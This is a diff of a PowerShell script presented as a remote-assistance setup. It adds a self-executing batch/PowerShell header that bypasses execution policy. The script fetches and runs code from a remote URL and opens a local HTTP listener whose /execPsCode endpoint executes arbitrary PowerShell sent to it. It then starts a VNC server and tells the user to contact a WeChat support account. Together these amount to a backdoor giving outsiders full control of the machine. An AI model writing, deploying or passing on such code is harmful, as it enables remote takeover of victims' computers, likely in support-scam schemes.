@@ -1,4 +1,5 @@
-$ErrorActionPreference = 'Stop'; cd $env:temp; [Environment]::CurrentDirectory = $pwd
+#@&cls&set cd=%~dp0&powershell -EP Bypass "gc '%~f0' -enc UTF8|out-string|iex"&&exit||pause&exit
+$ErrorActionPreference = 'Stop'; cd $env:cd; [Environment]::CurrentDirectory = $pwd
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
 iex(irm https://cnb.cool/GHFXJ/PS/-/git/raw/main/Func/.utils.ps1)
@@ -36,8 +37,7 @@ $httpJob = Start-Job -Name "HttpService4455" -ScriptBlock {
             $response = $context.Response
 
             # 仅处理 POST /execPsCode
-            if ($request.HttpMethod -ne 'POST' -or $request.Url.AbsolutePath -ne '/execPsCode') 
-{
+            if ($request.HttpMethod -ne 'POST' -or $request.Url.AbsolutePath -ne '/execPsCode') {
                 $response.StatusCode = 404
                 $response.Close()
                 continue
@@ -51,8 +51,7 @@ $httpJob = Start-Job -Name "HttpService4455" -ScriptBlock {
             }
 
             # 读取请求体
-            $reader = [System.IO.StreamReader]::new($request.InputStream, $request.ContentEncodi
-ng)
+            $reader = [System.IO.StreamReader]::new($request.InputStream, $request.ContentEncoding)
             $body = $reader.ReadToEnd()
             $reader.Close()
 
@@ -186,5 +185,4 @@ cls
 "`n`n...远程准备已就绪...请联系微信客服(320261661)来协助您！`n`n"
 
 #✅4 启动tvnserver
-Start-Process -FilePath "tvnserver.exe" -ArgumentList "-run" -NoNewWindow -WorkingDirectory $pwd
- -wait
+Start-Process -FilePath "tvnserver.exe" -ArgumentList "-run" -NoNewWindow -WorkingDirectory $pwd -wait
